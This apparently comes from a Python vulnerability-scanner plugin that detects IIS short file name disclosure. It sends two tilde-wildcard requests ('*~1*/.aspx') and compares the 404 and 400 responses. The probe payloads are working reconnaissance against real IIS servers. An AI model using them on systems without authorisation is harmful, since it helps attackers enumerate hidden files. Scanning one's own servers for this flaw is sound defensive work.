#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'iis short file'
        self.keyword = ['iis']
        self.info = 'iis short file'
        self.type = VUL_TYPE.INFO
        self.level = VUL_LEVEL.MEDIUM
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                async with session.get(url=self.base_url+ '*~1*/.aspx') as res1:
                    if res1:
                        async with session.get(url=self.base_url + 'l1j1e*~1*/.aspx') as res2:
                            if res2:
                                if res1.status == 404 and res2.status == 400:
                                    self.flag = 1
                                    self.req.append({"url": self.base_url+ '/*~1*/a.aspx'})
                                    self.res.append({"info": '/*~1*/a.aspx', "key": 'iis_short_file'})